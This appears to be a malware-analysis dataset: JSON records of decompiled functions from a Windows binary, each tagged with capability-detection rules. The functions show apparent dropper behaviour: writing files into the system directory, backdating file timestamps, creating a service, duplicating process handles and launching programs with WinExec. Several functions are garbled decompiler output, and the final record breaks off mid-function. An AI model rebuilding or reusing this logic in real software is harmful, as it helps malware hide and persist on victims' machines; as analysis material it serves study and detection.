{
    "00401130": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498",
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004011a6) overlaps instruction at (ram,0x004011a5)\n// \n// WARNING: Removing unreachable block (ram,0x00401155)\n// WARNING: Removing unreachable block (ram,0x00401196)\n// WARNING: Removing unreachable block (ram,0x00401211)\n// WARNING: Removing unreachable block (ram,0x00401227)\n// WARNING: Removing unreachable block (ram,0x0040122a)\n// WARNING: Removing unreachable block (ram,0x0040125f)\n// WARNING: Removing unreachable block (ram,0x00401286)\n// WARNING: Removing unreachable block (ram,0x00401298)\n\nuint fcn.00401130(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    char *extraout_ECX;\n    uint *unaff_EDI;\n    char in_SF;\n    char in_OF;\n    \n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        out(0xc4, in_EAX);\n        *unaff_EDI = in_EAX;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)();\n    if (iVar1 != 0) {\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n        *0x2c15ff52 = *0x2c15ff52 + *extraout_ECX;\n        return 0x2c15ff51;\n    }\n    return 0;\n}\n",
        "token_count": 330
    },
    "00403e70": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403f76) overlaps instruction at (ram,0x00403f6d)\n// \n// WARNING: Control flow encountered bad instruction data\n// WARNING: Removing unreachable block (ram,0x00403eba)\n// WARNING: Removing unreachable block (ram,0x00403ec4)\n\nvoid __thiscall fcn.00403e70(int32_t param_1, uchar *param_2, uint32_t param_3, uint *param_4, int32_t *param_5)\n\n{\n    uint8_t *puVar1;\n    uchar uVar2;\n    uint16_t uVar3;\n    uint32_t in_EAX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    int32_t extraout_ECX;\n    int32_t unaff_EBX;\n    uint16_t uVar8;\n    int32_t unaff_ESI;\n    int32_t iVar9;\n    uint16_t in_SS;\n    bool bVar10;\n    uint8_t in_AF;\n    bool in_ZF;\n    bool bVar11;\n    unkbyte6 Var12;\n    \n    uVar6 = param_3;\n    if ((!in_ZF) && (in_ZF)) {\n        param_2 = param_1 << 0x10 | in_SS;\n        uVar6 = in_EAX | 0x8b;\n        if (-1 < (in_EAX | 0x8b)) {\n    // WARNING: Could not recover jumptable at 0x00403e99. Too many branches\n    // WARNING: Treating indirect jump as call\n            (**(unaff_ESI + -0x75))(0x47);\n            return;\n        }\n    }\n    uVar4 = fcn.004011f0(0, param_2, uVar6 + 1 >> 1);\n    uVar4 = uVar4 & 0xffff;\n    bVar11 = uVar4 == 0;\n    bVar10 = false;\n    Var12 = (*_sym.imp.dbghelp.dll_ImageNtHeader)(param_2);\n    uVar5 = Var12;\n    uVar6 = uVar5;\n    if ((bVar11) || (!bVar11)) {\ncode_r0x00403ee5:\n        uVar6 = *(uVar6 + 0x58);\n        uVar3 = uVar6;\n        uVar8 = uVar4;\n        bVar10 = uVar8 < uVar3;\n        bVar11 = uVar8 == uVar3;\n        if (bVar10) {\n            if ((!SBORROW2(uVar8, uVar3)) && (SBORROW2(uVar8, uVar3))) {\n                uVar2 = in(Var12 >> 0x20);\n                *param_2 = uVar2;\n                goto code_r0x00403f2e;\n            }\n            uVar4 = (uVar4 - uVar6 & 0xffff) - 1;\n        }\n        else {\n            uVar4 = uVar4 - (uVar6 & 0xffff);\n        }\n        bVar10 = uVar4 < uVar6 >> 0x10;\n        if (bVar10) {\n            if ((bVar10) || (!bVar10)) {\n                uVar4 = uVar4 - (uVar6 >> 0x10);\n            }\n            else {\n                *(uVar4 + 0x43d1773a) = *(uVar4 + 0x43d1773a) ^ 0x2b27e95e;\n                LOCK();\n            }\n            iVar9 = (uVar4 & 0xffff) - 1;\n        }\n        else {\n            iVar9 = uVar4 - (uVar6 >> 0x10);\n        }\n        *param_5 = iVar9 + param_3;\n    }\n    else {\n        if (!bVar10 && unaff_EBX + 1 != 0) {\n            in_AF = 9 < (Var12 & 0xf) | in_AF;\n            uVar6 = uVar5 & 0xffff0000 | CONCAT11((Var12 >> 8) + in_AF, Var12 + in_AF * '\\x06') & 0xff0f;\n            *(uVar6 + 0x2a) = *(uVar6 + 0x2a) - (unaff_EBX + 1);\n            uVar4 = uVar4 + 1;\n            goto code_r0x00403ee5;\n        }\n        puVar1 = unaff_EBX + -0x43 + uVar4 * 4;\n        uVar7 = extraout_ECX >> 8;\n        bVar10 = CARRY1(*puVar1, uVar7);\n        *puVar1 = *puVar1 + uVar7;\n        bVar11 = *puVar1 == 0;\ncode_r0x00403f2e:\n        if (bVar10 || bVar11) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puVar1 = extraout_ECX + 0x53665011;\n        *puVar1 = *puVar1 >> 1 | *puVar1 << 7;\n    }\n    *param_4 = *(uVar5 + 0x58);\n    return;\n}\n",
        "token_count": 1195
    },
    "004012b0": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040136a) overlaps instruction at (ram,0x00401368)\n// \n// WARNING: Removing unreachable block (ram,0x004013ac)\n// WARNING: Removing unreachable block (ram,0x004013b9)\n// WARNING: Removing unreachable block (ram,0x0040136a)\n\nuint64_t __cdecl fcn.004012b0(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint extraout_EDX;\n    uint extraout_EDX_00;\n    uint uVar5;\n    uint *puVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    bool bVar10;\n    uint64_t uVar11;\n    uchar lpBuffer;\n    uint var_22bh;\n    uint uStack552;\n    uint var_128h;\n    uint var_24h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    \n    _lpBuffer = _lpBuffer & 0xffffff00;\n    var_128h._0_1_ = 0;\n    puVar6 = &var_22bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    bVar10 = false;\n    puVar6 = &var_128h + 1;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar6 = 0;\n        puVar6 = puVar6 + 1;\n    }\n    *puVar6 = 0;\n    *(puVar6 + 2) = 0;\n    puVar6 = &lpBuffer;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(puVar6, 0x104);\n    if ((!bVar10) && (bVar10)) {\n        *puVar6 = uStack552;\n        return CONCAT44(_lpBuffer, uStack552);\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar8 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar6 = pcVar8 + -uVar3;\n    puVar9 = &var_128h;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x411298;\n    do {\n        pcVar8 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    puVar6 = &var_128h;\n    do {\n        puVar9 = puVar6;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        puVar9 = puVar6 + 1;\n        cVar1 = *puVar6;\n        puVar6 = puVar9;\n    } while (cVar1 != '\\0');\n    puVar6 = pcVar8 + -uVar3;\n    puVar9 = puVar9 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_128h, 0, &var_24h);\n    bVar10 = SBORROW4(arg_ch, -1);\n    iVar2 = arg_ch;\n    if (arg_ch == -1) {\n        uVar11 = fcn.004011c0(arg_8h);\n        iVar2 = uVar11;\n        bVar10 = SBORROW4(iVar2, -1);\n        if (iVar2 == -1) {\n            return uVar11 & 0xffffffff00000000;\n        }\n    }\n    if ((!bVar10) && (bVar10)) {\n        LOCK();\n        arg_ch = 0x138b2633;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    uVar5 = extraout_EDX;\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n        uVar5 = extraout_EDX_00;\n    }\n    return CONCAT44(uVar5, 1);\n}\n",
        "token_count": 1425
    },
    "00404820": {
        "rules": [
            "decompress data using LZO/119ff19994674493853a9d8636ba63bf",
            "hash data using jshash/b1c33655e5b8435da69c7094541b75b8"
        ],
        "decompiled_code": "\nuint fcn.00404820(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char **ppcVar6;\n    uint *puVar7;\n    char *pcVar8;\n    char *pcVar9;\n    char *pcVar10;\n    uint *puVar11;\n    uint noname_2;\n    uchar *noname_3;\n    uint arg_8h;\n    uchar *arg_ch;\n    uint uStack2112;\n    uint uStack2088;\n    char cStack2084;\n    uint uStack2083;\n    ushort uStack2079;\n    uchar uStack2077;\n    uchar uStack2064;\n    uint uStack2063;\n    uchar auStack1824 [12];\n    uchar auStack1812 [8];\n    uchar uStack1804;\n    uint uStack1803;\n    uchar auStack1564 [260];\n    char acStack1304 [20];\n    uchar auStack1284 [239];\n    char acStack1045 [21];\n    uchar uStack1024;\n    uint uStack1023;\n    \n    if (*0x4236f0 == 0) {\n        return 0;\n    }\n    uStack2088 = 0;\n    cStack2084 = '\\0';\n    uStack2083 = 0;\n    uStack2079 = 0;\n    uStack2077 = 0;\n    uStack2064 = 0;\n    puVar7 = &uStack2063;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1804 = 0;\n    puVar7 = &uStack1803;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    uStack1024 = 0;\n    puVar7 = &uStack1023;\n    for (iVar2 = 0xff; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    arg_ch = auStack1284;\n    uStack2112 = 0x104;\n    *(puVar7 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    noname_3 = auStack1812;\n    arg_8h = 0x104;\n    noname_2 = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleFileNameA)();\n    fcn.00404a30(&uStack2112, 6, noname_2, noname_3, arg_8h, arg_ch);\n    (*_sym.imp.MSVCRT.dll_sprintf)(auStack1564, 0x411534, acStack1304, &uStack2112);\n    uStack2088 = 0x4115bc;\n    ppcVar6 = &stack0xfffff7d0;\n    iVar2 = 3;\n    do {\n        uVar3 = 0xffffffff;\n        pcVar9 = &cStack2084;\n        do {\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar9 + 1;\n        } while (cVar1 != '\\0');\n        pcVar9 = *ppcVar6;\n        ppcVar6 = ppcVar6 + 1;\n        *(&uStack2088 + ~uVar3 + 3) = 10;\n        uVar3 = 0xffffffff;\n        do {\n            pcVar8 = pcVar9;\n            if (uVar3 == 0) break;\n            uVar3 = uVar3 - 1;\n            pcVar8 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar8;\n        } while (cVar1 != '\\0');\n        uVar3 = ~uVar3;\n        iVar4 = -1;\n        pcVar9 = &cStack2084;\n        do {\n            pcVar10 = pcVar9;\n            if (iVar4 == 0) break;\n            iVar4 = iVar4 + -1;\n            pcVar10 = pcVar9 + 1;\n            cVar1 = *pcVar9;\n            pcVar9 = pcVar10;\n        } while (cVar1 != '\\0');\n        puVar7 = pcVar8 + -uVar3;\n        puVar11 = pcVar10 + -1;\n        for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n        iVar2 = iVar2 + -1;\n        for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n            *puVar11 = *puVar7;\n            puVar7 = puVar7 + 1;\n            puVar11 = puVar11 + 1;\n        }\n    } while (iVar2 != 0);\n    (*_sym.imp.MSVCRT.dll_sprintf)(acStack1045 + 1, &cStack2084, auStack1824, auStack1824, acStack1304[0]);\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    acStack1045[~uVar3] = '\\n';\n    uVar3 = 0xffffffff;\n    pcVar9 = 0x4115d4;\n    do {\n        pcVar8 = pcVar9;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar8 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar8;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar9 = acStack1045 + 1;\n    do {\n        pcVar10 = pcVar9;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar10 = pcVar9 + 1;\n        cVar1 = *pcVar9;\n        pcVar9 = pcVar10;\n    } while (cVar1 != '\\0');\n    puVar7 = pcVar8 + -uVar3;\n    puVar11 = pcVar10 + -1;\n    for (uVar5 = uVar3 >> 2; uVar5 != 0; uVar5 = uVar5 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar11 = *puVar7;\n        puVar7 = puVar7 + 1;\n        puVar11 = puVar11 + 1;\n    }\n    pcVar9 = acStack1045;\n    uVar3 = 0xffffffff;\n    do {\n        pcVar9 = pcVar9 + 1;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n    } while (*pcVar9 != '\\0');\n    iVar2 = fcn.00401090(auStack1564, 0x411530, acStack1045 + 1, ~uVar3 - 1);\n    if (iVar2 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)(auStack1564, 0);\n    return 1;\n}\n",
        "token_count": 1936
    },
    "00402050": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00402050(uint arg_8h)\n\n{\n    uchar in_AL;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t unaff_EDI;\n    char in_SF;\n    char in_OF;\n    uint hObject;\n    \n    if ((in_OF == in_SF) && (in_OF != in_SF)) {\n        *(unaff_EDI | &stack0xfffffffc) = in_AL;\n    }\n    iVar1 = fcn.00403d10(0x4112cc);\n    if (iVar1 == -1) {\n        return 0;\n    }\n    iVar1 = (*_sym.imp.KERNEL32.dll_OpenProcess)();\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_GetCurrentProcess)();\n    iVar2 = (*_sym.imp.KERNEL32.dll_DuplicateHandle)();\n    if (iVar2 != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 246
    },
    "00402120": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x0040217c) overlaps instruction at (ram,0x0040217b)\n// \n// WARNING: Removing unreachable block (ram,0x0040217c)\n\nuint fcn.00402120(uint param_1, uint32_t param_2, uint param_3)\n\n{\n    char cVar1;\n    int32_t arg_8h;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    bool bVar6;\n    ulong uVar7;\n    \n    *0x4236ec = fcn.00403b10();\n    arg_8h = (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    if (arg_8h == -1) {\n        return 0;\n    }\n    puVar5 = &stack0xfffffffc;\n    if ((arg_8h == -1) && (puVar5 = &stack0xfffffffc,  arg_8h != -1)) {\n        arg_8h = -2;\n        uVar7 = func_0x101880ff();\n        param_3 = uVar7 >> 0x20;\n        param_2 = uVar7 | 0x8d;\n        puVar5 = &stack0xfffffffb;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_WriteFile)(arg_8h, param_2, param_3);\n    bVar6 = iVar2 == 0;\n    if (bVar6) {\n        return 0;\n    }\n    if ((!bVar6) && (bVar6)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    if (*0x4236ec != 0) {\n        iVar2 = fcn.00402050(arg_8h);\n        *0x4236ec = iVar2 == 0;\n    }\n    bVar6 = (POPCOUNT(*0x4236ec & 0xff) & 1U) != 0;\n    if ((bVar6) && (!bVar6)) {\n        puVar4 = &stack0xffffffcc;\n        cVar1 = '\\x1e';\n        do {\n            puVar5 = puVar5 + -1;\n            puVar4 = puVar4 + -1;\n            *puVar4 = *puVar5;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n        uVar3 = in(0x78);\n        return uVar3;\n    }\n    fcn.004012b0(0, arg_8h);\n    if (*0x4236ec == 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    return 1;\n}\n",
        "token_count": 624
    },
    "00403020": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403145) overlaps instruction at (ram,0x00403144)\n// \n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuchar * __cdecl fcn.00403020(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uchar **ppuVar1;\n    uint32_t uVar2;\n    uchar *puVar3;\n    uint8_t extraout_CL;\n    uint8_t extraout_CL_00;\n    uint8_t extraout_CL_01;\n    uint8_t extraout_CL_02;\n    uint8_t uVar4;\n    int32_t iVar5;\n    ushort uVar6;\n    ushort uVar7;\n    uchar *puVar8;\n    uint *puVar9;\n    bool bVar10;\n    bool bVar11;\n    ulong uVar12;\n    uchar *puStack556;\n    uint uStack552;\n    uchar lpBuffer;\n    uint var_213h;\n    uchar s;\n    uint var_10fh;\n    uchar *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpBuffer = 0;\n    puVar9 = &var_213h;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    *(puVar9 + 2) = 0;\n    s = 0;\n    puVar9 = &var_10fh;\n    for (iVar5 = 0x40; iVar5 != 0; iVar5 = iVar5 + -1) {\n        *puVar9 = 0;\n        puVar9 = puVar9 + 1;\n    }\n    *puVar9 = 0;\n    var_ch = 0x1;\n    *(puVar9 + 2) = 0;\n    puStack556 = &lpBuffer;\n    uStack552 = 0x104;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    (*_sym.imp.MSVCRT.dll_sprintf)(&s, 0x411280);\n    fcn.004039b0(&var_4h, &var_8h);\n    iVar5 = fcn.004043c0(arg_8h, arg_ch, arg_10h, arg_14h, var_4h, var_8h);\n    if (iVar5 == 0) {\n        return NULL;\n    }\n    uVar2 = fcn.00402120(&s);\n    bVar10 = (POPCOUNT(uVar2 & 0xff) & 1U) != 0;\n    if (uVar2 == 0) {\n        return NULL;\n    }\n    if ((bVar10) && (!bVar10)) {\n        *(uVar2 + 0x57) = *(uVar2 + 0x57) + -9;\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    fcn.00402ef0();\n    iVar5 = fcn.00403d10(0x4112b8);\n    if (iVar5 == -1) {\n        iVar5 = fcn.00403d10(0x4112ac);\n        bVar10 = SBORROW4(iVar5, -1);\n        if (iVar5 == -1) goto code_r0x004031fd;\n    }\n    iVar5 = fcn.00403b90(arg_8h);\n    if (iVar5 != 0) {\n        fcn.004047f0();\n        fcn.004046d0();\n        return 0x1;\n    }\n    bVar10 = false;\n    if (*0x4236ec == 0) {\n        return NULL;\n    }\ncode_r0x004031fd:\n    if ((!bVar10) && (bVar10)) {\n        LOCK();\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar12 = fcn.00403de0(arg_8h, &s);\n    puVar3 = uVar12;\n    puVar8 = var_ch;\n    if (puVar3 == NULL) {\n        puVar8 = NULL;\n    }\n    uVar6 = uVar12 >> 0x20;\n    uVar7 = uVar12 >> 0x30;\n    uVar4 = extraout_CL;\n    if ((puVar8 != NULL) &&\n       (uVar6 = 0,  uVar7 = 0,  puVar3 = fcn.00404680(arg_8h),  uVar4 = extraout_CL_00,  puVar3 == NULL)) {\n        var_ch = NULL;\n        puVar8 = puVar3;\n    }\n    uVar12 = CONCAT44(CONCAT22(uVar7, uVar6), puVar3);\n    bVar10 = false;\n    if (puVar8 == NULL) {\n        uVar12 = fcn.00402250(arg_8h, 0);\n        puVar8 = uVar12;\n        bVar10 = 0xfffffff7 < &stack0xfffffdcc;\n        uVar4 = extraout_CL_01;\n        var_ch = puVar8;\n    }\n    iVar5 = uVar12;\n    if ((!bVar10) && (bVar10)) {\n        puVar8 = puVar8 + bVar10 + *(puVar8 + (uVar12 >> 0x20) * 4 + 0x69);\n    }\n    bVar11 = false;\n    bVar10 = puVar8 == NULL;\n    ppuVar1 = puVar8;\n    if (!bVar10) {\n        iVar5 = fcn.004046d0();\n        bVar11 = SCARRY4(&stack0xfffffdd0, 4);\n        ppuVar1 = &puStack556;\n        uVar4 = extraout_CL_02;\n    }\n    if (((bVar10 || *0x10 == 0x22c) || bVar11 != ppuVar1 < 0) || ((!bVar10 && *0x10 != 0x22c) && bVar11 == ppuVar1 < 0))\n    {\n        (*_sym.imp.KERNEL32.dll_Sleep)();\n    }\n    else {\n        puVar8 = puVar8 + 1;\n        *(iVar5 + 0x6839da56) = *(iVar5 + 0x6839da56) ^ uVar4;\n        func_0xff4032c6();\n    }\n    (*_sym.imp.KERNEL32.dll_WinExec)();\n    return puVar8;\n}\n",
        "token_count": 1502
    },
    "004034b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004034b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.MSVCRT.dll__access)(arg_8h, 0);\n    if (iVar1 != -1) {\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 73
    },
    "00403b10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.00403b10(void)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_10ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n    iVar1 = fcn.004046e0(0x80000002, 0x411540, 0x411580, uVar2 - 8, uVar2 - 0x10c, uVar2 - 4);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll__access)(uVar2 - 0x10c, 0);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 182
    },
    "00403d10": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403d6a) overlaps instruction at (ram,0x00403d67)\n// \n// WARNING: Removing unreachable block (ram,0x00403d61)\n\nuint __cdecl fcn.00403d10(uint arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uchar *puVar3;\n    uint *puVar4;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    var_8h = (**0x4236f8)();\n    if (var_8h == -1) {\n        return 0xffffffff;\n    }\n    puVar4 = &var_12ch;\n    for (iVar2 = 0x49; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = 0;\n        puVar4 = puVar4 + 1;\n    }\n    // WARNING: Bad instruction - Truncating control flow here\n    iVar2 = (**0x4236fc)();\n    pcVar1 = _sym.imp.MSVCRT.dll__stricmp;\n    do {\n        puVar3 = &stack0xfffffffc;\n        if (iVar2 == 0) {\ncode_r0x00403dca:\n            (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            return *(puVar3 + -4);\n        }\n        iVar2 = (*pcVar1)();\n        if (iVar2 == 0) {\n            puVar3 = &stack0xfffffffc & 0xffff0000 | *0x10 - 4;\n            *(puVar3 + -4) = *(puVar3 + -0x128);\n            goto code_r0x00403dca;\n        }\n        iVar2 = (**0x423700)();\n    } while( true );\n}\n",
        "token_count": 446
    },
    "004040a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040438e) overlaps instruction at (ram,0x0040438a)\n// \n// WARNING: Removing unreachable block (ram,0x0040417f)\n// WARNING: Removing unreachable block (ram,0x004041fa)\n// WARNING: Removing unreachable block (ram,0x004041fe)\n// WARNING: Removing unreachable block (ram,0x00404213)\n// WARNING: Removing unreachable block (ram,0x00404207)\n// WARNING: Removing unreachable block (ram,0x00404227)\n// WARNING: Removing unreachable block (ram,0x00404282)\n// WARNING: Removing unreachable block (ram,0x0040428e)\n// WARNING: Removing unreachable block (ram,0x00404297)\n// WARNING: Removing unreachable block (ram,0x00404299)\n// WARNING: Removing unreachable block (ram,0x004042a0)\n// WARNING: Removing unreachable block (ram,0x004042c1)\n// WARNING: Removing unreachable block (ram,0x004042dd)\n// WARNING: Removing unreachable block (ram,0x004042d5)\n// WARNING: Removing unreachable block (ram,0x004042f1)\n// WARNING: Removing unreachable block (ram,0x00404305)\n// WARNING: Removing unreachable block (ram,0x00404307)\n// WARNING: Removing unreachable block (ram,0x0040432b)\n// WARNING: Removing unreachable block (ram,0x00404317)\n// WARNING: Removing unreachable block (ram,0x00404321)\n// WARNING: Removing unreachable block (ram,0x0040432e)\n// WARNING: Removing unreachable block (ram,0x00404355)\n// WARNING: Removing unreachable block (ram,0x00404379)\n// WARNING: Removing unreachable block (ram,0x0040437b)\n// WARNING: Removing unreachable block (ram,0x0040438e)\n// WARNING: Removing unreachable block (ram,0x00404395)\n// WARNING: Removing unreachable block (ram,0x00404381)\n\nchar * __cdecl\nfcn.004040a0(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int32_t extraout_ECX;\n    uchar *extraout_ECX_00;\n    char unaff_BL;\n    int32_t unaff_EDI;\n    uint8_t in_AF;\n    uint32_t unaff_retaddr;\n    uint var_31ch;\n    uint lpBuffer;\n    uint var_114h;\n    uint var_10bh;\n    uint var_10h;\n    uint pcbBuffer;\n    uint var_8h;\n    uint var_4h;\n    \n    